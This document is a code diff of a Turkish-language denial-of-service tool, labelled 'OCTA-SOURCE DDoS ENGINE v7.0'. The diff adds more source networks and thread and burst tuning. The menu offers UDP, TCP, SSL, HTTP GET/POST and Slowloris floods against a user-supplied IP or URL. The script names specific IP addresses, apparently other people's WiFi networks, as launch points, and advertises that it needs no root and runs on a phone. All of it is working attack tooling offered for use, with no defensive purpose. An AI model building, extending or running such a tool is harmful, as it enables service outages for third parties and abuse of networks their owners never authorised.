-            elif own_iface:
-                net["interface"] = own_iface
-    
-    except Exception as e:
-        print(f"\033[1;33m[!] Ağ tespiti: {e}\033[0m")
-        # Fallback: kendi interface'ini kullan
-        for net in SOURCE_NETWORKS:
-            net["interface"] = own_iface
-
 def launch_attack(target, port, attack_mode, target_is_ip=False):
-    global running, start_time, stats
+    global running, start_time, total_packets, total_bytes, total_errors
     
     running = True
     start_time = time.time()
-    
-    with stats_lock:
-        stats["total_packets"] = 0
-        stats["total_bytes"] = 0
-        stats["total_errors"] = 0
-        stats["network_stats"] = {}
+    total_packets = 0
+    total_bytes = 0
+    total_errors = 0
     
     # URL hazırlığı
     target_url = None
@@ -667,66 +447,51 @@ def launch_attack(target, port, attack_mode, target_is_ip=False):
         if not target_url.startswith('http'):
             target_url = f"https://{target_url}"
     
-    # Ağ arayüzlerini bul
-    find_network_interfaces()
-    
     print(f"\n\033[1;31m{'='*65}\033[0m")
-    print(f"\033[1;31m🔥 5 KAYNAK AĞ İLE DDoS SALDIRISI BAŞLATILDI 🔥\033[0m")
+    print(f"\033[1;31m🔥 8 KAYNAK AĞ İLE MAX GÜÇ DDoS 🔥\033[0m")
     print(f"\033[1;31m{'='*65}\033[0m")
     print(f"\033[1;36m🎯 Hedef: \033[1;33m{target}\033[0m")
     print(f"\033[1;36m🔌 Port: \033[1;33m{port}\033[0m")
-    print(f"\033[1;36m🌐 Kaynak Ağlar:\033[0m")
-    print(f"\033[1;33m    1) {OWN_IP} (SENIN WIFI)\033[0m")
-    print(f"\033[1;33m    2) 192.168.1.1 (ROUTER/GATEWAY)\033[0m")
-    print(f"\033[1;33m    3) 78.181.164.55 (HEDEF AĞ-1)\033[0m")
-    print(f"\033[1;33m    4) 192.168.1.140 (HEDEF AĞ-2)\033[0m")
-    print(f"\033[1;33m    5) 192.168.1.138 (HEDEF AĞ-3)\033[0m")
+    print(f"\033[1;36m🌐 Kaynak Ağlar (WiFi'ler - tools KURMAZ):\033[0m")
+    print(f"\033[1;33m    1) {OWN_IP} (SENiN WiFi)\033[0m")
+    for i, net in enumerate(SOURCE_NETWORKS, 2):
+        print(f"\033[1;33m    {i}) {net['ip']} ({net['name']})\033[0m")
     print(f"\033[1;36m⚙️  Mod: \033[1;33m{attack_mode.upper()}\033[0m")
-    print(f"\033[1;36m🧵 Thread/Ağ: \033[1;33m{THREADS_PER_NETWORK:,}\033[0m")
-    print(f"\033[1;36m🖥️  Process: \033[1;33m{MAX_PROCESSES}\033[0m")
-    print(f"\033[1;36m🔓 Root: \033[1;32mGEREKMEZ\033[0m")
+    print(f"\033[1;36m🧵 Thread: \033[1;33m{MAX_THREADS:,}\033[0m")
+    print(f"\033[1;36m⚡ Burst: \033[1;33m{BURST_SIZE} paket/thread\033[0m")
+    print(f"\033[1;36m💻 CPU: \033[1;32mDÜŞÜK (telefon donmaz)\033[0m")
     print(f"\033[1;31m{'='*65}\033[0m")
     print(f"\033[1;37m[!] Ctrl+C ile durdur\033[0m")
-    print(f"\033[1;37m[!] HER AĞ AYRI AYNI SALDIRI YAPIYOR\033[0m\n")
+    print(f"\033[1;37m[!] Her WiFi kendi interneti ile saldırıyor\033[0m\n")
     
-    # İstatistik thread'i
-    t = threading.Thread(target=stats_monitor)
+    # İstatistik
+    t = threading.Thread(target=stats_light)
     t.daemon = True
     t.start()
     
-    # Her ağ için worker başlat
-    processes = []
+    # Tüm kaynak ağlar için worker'ları başlat
+    all_workers = []
+    total_threads = 0
     
+    # Kendi ağımız
+    worker = OptimizedWorker(target, port, attack_mode, target_url, OWN_IP)
+    n = worker.start()
+    all_workers.append(worker)
+    total_threads += n
+    print(f"\033[1;32m  [✓] {OWN_IP} (Senin WiFi) → {n} thread\033[0m")
+    
+    # Diğer kaynak ağlar
     for net in SOURCE_NETWORKS:
-        # Her ağ için 2 process
-        for p in range(2):
-            proc = multiprocessing.Process(
-                target=network_worker,
-                args=(target, port, attack_mode, target_url, net)
-            )
-            proc.daemon = True
-            processes.append(proc)
-            proc.start()
-            time.sleep(0.1)
+        if net["active"]:
+            worker = OptimizedWorker(target, port, attack_mode, target_url, net["ip"])
+            n = worker.start()
+            all_workers.append(worker)
+            total_threads += n
+            print(f"\033[1;32m  [✓] {net['ip']} ({net['name']}) → {n} thread\033[0m")
     
-    # Kendi IP'miz için de worker
-    own_net = {"ip": OWN_IP or "192.168.1.100", "name": "Senin WiFi", "interface": OWN_INTERFACE}
-    for p in range(2):
-        proc = multiprocessing.Process(
-            target=network_worker,
-            args=(target, port, attack_mode, target_url, own_net)
-        )
-        proc.daemon = True
-        processes.append(proc)
-        proc.start()
-        time.sleep(0.1)
-    
-    total = len(processes)
-    total_threads = total * (THREADS_PER_NETWORK // 2)
-    
-    print(f"\n\033[1;32m[✅] {total} process başlatıldı ({len(SOURCE_NETWORKS)+1} ağ)")
-    print(f"[✅] ~{total_threads:,} thread aktif")
-    print(f"[✅] Tüm ağlardan EŞ ZAMANLI saldırı\033[0m\n")
+    print(f"\n\033[1;32m[✅] Toplam {len(all_workers)} kaynak ağ, {total_threads:,} thread aktif!")
+    print(f"[✅] 8 WiFi ağı üzerinden MAX GÜÇ saldırı BAŞLADI!\033[0m")
+    print(f"\033[1;33m[⚡] Gerçek paketler - Her ağ kendi internetini kullanıyor\033[0m\n")
     
     try:
         while running:
@@ -735,14 +500,10 @@ def launch_attack(target, port, attack_mode, target_is_ip=False):
         running = False
         elapsed = time.time() - start_time
         
-        for proc in processes:
-            proc.terminate()
-            proc.join(timeout=1)
-        
         with stats_lock:
-            f_pkts = stats["total_packets"]
-            f_bytes = stats["total_bytes"]
-            f_errs = stats["total_errors"]
+            f_pkts = total_packets
+            f_bytes = total_bytes
+            f_errs = total_errors
         
         mbps = (f_bytes * 8) / elapsed / 1_000_000 if elapsed > 0 else 0
         
@@ -757,46 +518,49 @@ def launch_attack(target, port, attack_mode, target_is_ip=False):
 # ==================== MENU ====================
 
 def main():
-    global THREADS_PER_NETWORK, MAX_PROCESSES
+    global MAX_THREADS, BURST_SIZE, CPU_SAVE_MODE, OWN_IP
     
     os.system('clear')
+    
+    # Kendi IP'ni al
+    OWN_IP = get_own_ip()
+    
     print("""\033[1;36m
     ╔══════════════════════════════════════════════════╗
-    ║      QUAD-SOURCE DDoS ENGINE v6.0              ║
-    ║      5 KAYNAK AĞ İLE DDoS                      ║
+    ║        OCTA-SOURCE DDoS ENGINE v7.0             ║
+    ║        8 KAYNAK AĞ İLE MAX GÜÇ                  ║
     ║                                                ║
-    ║      ✓ Senin WiFi                              ║
-    ║      ✓ 192.168.1.1 (Gateway)                   ║
-    ║      ✓ 78.181.164.55                           ║
-    ║      ✓ 192.168.1.140                           ║
-    ║      ✓ 192.168.1.138                           ║
+    ║      ✓ Senin WiFi: """ + f"{OWN_IP or 'OTOMATIK'}" + """                    ║
+    ║      ✓ 78.181.164.55                            ║
+    ║      ✓ 192.168.1.140                            ║
+    ║      ✓ 192.168.1.138                            ║
+    ║      ✓ 192.168.1.107                            ║
+    ║      ✓ 192.168.0.101                            ║
+    ║      ✓ 192.168.0.105                            ║
     ║                                                ║
-    ║      Layer 4 + Layer 7 | ROOT GEREKMEZ         ║
-    ║      Gerçek ağ bağlantıları | Gerçek paketler   ║
+    ║      L4+L7 | ROOT GEREKMEZ | DÜŞÜK CPU         ║
+    ║      Her WiFi kendi internetini kullanır        ║
     ╚══════════════════════════════════════════════════╝
     \033[0m""")
     
     print("\033[1;36m╔════════════════════════════════════════╗\033[0m")
     print("\033[1;36m║        SALDIRI MODU SEÇİN            ║\033[0m")
     print("\033[1;36m╠════════════════════════════════════════╣\033[0m")
-    print("\033[1;36m║  \033[1;33m[1]\033[1;36m L4 → UDP Flood (MAX PAKET)       ║\033[0m")
-    print("\033[1;36m║  \033[1;33m[2]\033[1;36m L4 → TCP Connect Flood          ║\033[0m")
-    print("\033[1;36m║  \033[1;33m[3]\033[1;36m L4 → TCP SYN Flood              ║\033[0m")
-    print("\033[1;36m║  \033[1;33m[4]\033[1;36m L4 → SSL/TLS Handshake Flood    ║\033[0m")
-    print("\033[1;36m║  \033[1;33m[5]\033[1;36m L4 → TÜMÜ (UDP+TCP+SYN+SSL)     ║\033[0m")
-    print("\033[1;36m║  \033[1;33m[6]\033[1;36m L7 → HTTP GET Flood             ║\033[0m")
-    print("\033[1;36m║  \033[1;33m[7]\033[1;36m L7 → HTTP POST (256KB)          ║\033[0m")
-    print("\033[1;36m║  \033[1;33m[8]\033[1;36m L7 → Slowloris                  ║\033[0m")
-    print("\033[1;36m║  \033[1;33m[9]\033[1;36m L7 → TÜMÜ (GET+POST+Slow)       ║\033[0m")
-    print("\033[1;36m║  \033[1;31m[10]\033[1;36m L4+L7 KOMBO (MAX GÜÇ!)          ║\033[0m")
+    print("\033[1;36m║  \033[1;33m[1]\033[1;36m L4 → UDP Flood (BURST)            ║\033[0m")
+    print("\033[1;36m║  \033[1;33m[2]\033[1;36m L4 → TCP Flood                   ║\033[0m")
+    print("\033[1;36m║  \033[1;33m[3]\033[1;36m L4 → SSL/TLS Flood               ║\033[0m")
+    print("\033[1;36m║  \033[1;33m[4]\033[1;36m L4 → TÜMÜ (UDP+TCP+SSL)          ║\033[0m")
+    print("\033[1;36m║  \033[1;33m[5]\033[1;36m L7 → HTTP GET Flood              ║\033[0m")
+    print("\033[1;36m║  \033[1;33m[6]\033[1;36m L7 → HTTP POST Flood             ║\033[0m")
+    print("\033[1;36m║  \033[1;33m[7]\033[1;36m L7 → TÜMÜ (GET+POST)             ║\033[0m")
+    print("\033[1;36m║  \033[1;31m[8]\033[1;36m L4+L7 KOMBO (MAX GÜÇ!)            ║\033[0m")
     print("\033[1;36m╚════════════════════════════════════════╝\033[0m")
     
-    choice = input("\n\033[1;33m[?] Seçim (1-10): \033[0m").strip()
+    choice = input("\n\033[1;33m[?] Seçim (1-8): \033[0m").strip()
     
     modes = {
-        "1": "udp", "2": "tcp", "3": "syn", "4": "ssl",
-        "5": "all4", "6": "get", "7": "post", "8": "slow",
-        "9": "all7", "10": "all"
+        "1": "udp", "2": "tcp", "3": "ssl", "4": "all4",
+        "5": "get", "6": "post", "7": "all7", "8": "all"
     }
     
     if choice not in modes:
@@ -831,7 +595,7 @@ def main():
     elif tc == "2":
         target = input("\033[1;33m[?] Hedef IP: \033[0m").strip()
         is_ip = True
-        port_str = input("\033[1;33m[?] Port (örn: 80, 443): \033[0m").strip()
+        port_str = input("\033[1;33m[?] Port: \033[0m").strip()
         try:
             port = int(port_str)
         except:
@@ -841,22 +605,24 @@ def main():
         return
     
     # Performans ayarları
-    tc = input(f"\033[1;33m[?] Thread/Ağ (varsayılan: {THREADS_PER_NETWORK}, max 5000): \033[0m").strip()
+    tc = input(f"\033[1;33m[?] Thread sayısı (varsayılan: {MAX_THREADS}, düşük CPU için 200-500): \033[0m").strip()
     if tc:
         try:
-            THREADS_PER_NETWORK = max(100, min(5000, int(tc)))
+            MAX_THREADS = max(50, min(2000, int(tc)))
         except:
             pass
     
-    pc = input(f"\033[1;33m[?] Process sayısı (varsayılan: {MAX_PROCESSES}, CPU kadar): \033[0m").strip()
-    if pc:
+    bc = input(f"\033[1;33m[?] Burst boyutu (varsayılan: {BURST_SIZE}, her thread'deki paket sayısı): \033[0m").strip()
+    if bc:
         try:
-            MAX_PROCESSES = max(1, min(8, int(pc)))
+            BURST_SIZE = max(5, min(100, int(bc)))
         except:
             pass
+    
+    cm = input(f"\033[1;33m[?] CPU tasarrufu? (e/h, varsayılan: e): \033[0m").strip().lower()
+    CPU_SAVE_MODE = cm != 'h'
     
     launch_attack(target, port, attack_mode, is_ip)
 
 if __name__ == "__main__":
-    multiprocessing.freeze_support()
     main()
